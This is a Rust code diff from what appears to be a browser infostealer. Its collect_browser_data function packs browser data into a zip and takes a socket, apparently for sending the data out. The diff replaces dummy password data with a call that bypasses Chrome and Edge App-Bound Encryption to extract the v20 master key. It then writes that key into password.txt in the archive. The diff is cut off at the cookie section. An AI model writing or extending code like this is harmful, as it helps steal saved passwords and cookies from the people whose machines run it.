@@ -6,6 +6,7 @@ use zip::ZipWriter;
 
 use crate::Sock;
 use crate::send;
+use crate::abe_bypass;
 
 pub fn collect_browser_data(browser_name: &str, sock: &Sock) {
     let mut buf = Vec::new();
@@ -15,16 +16,26 @@ pub fn collect_browser_data(browser_name: &str, sock: &Sock) {
         .compression_method(zip::CompressionMethod::Stored)
         .unix_permissions(0o755);
 
-    // Dummy data counts
-    let pass_count = 15;
-    let cookie_count = 124;
-    let history_count = 850;
-    let autofill_count = 42;
+    // Attempt ABE bypass to get real master key
+    let key = if browser_name.to_lowercase() == "chrome" || browser_name.to_lowercase() == "edge" {
+        abe_bypass::extract_v20_key(browser_name)
+    } else {
+        None
+    };
 
-    // password.txt
+    let (pass_count, key_status) = if let Some(k) = key {
+        (1, format!("v20_master_key: {}", hex::encode(k)))
+    } else {
+        (0, "v20_master_key: not found".to_string())
+    };
+
+    let cookie_count = 0;
+    let history_count = 0;
+    let autofill_count = 0;
+
+    // password.txt (placeholder showing the extracted key)
     let _ = zip.start_file("password.txt", options);
-    let _ = zip.write_all(b"url: https://example.com\nuser: admin\npass: password123\n\n");
-    let _ = zip.write_all(b"url: https://google.com\nuser: jules\npass: secret\n");
+    let _ = zip.write_all(key_status.as_bytes());
 
     // cookie.txt
     let _ = zip.start_file("cookie.txt", options);
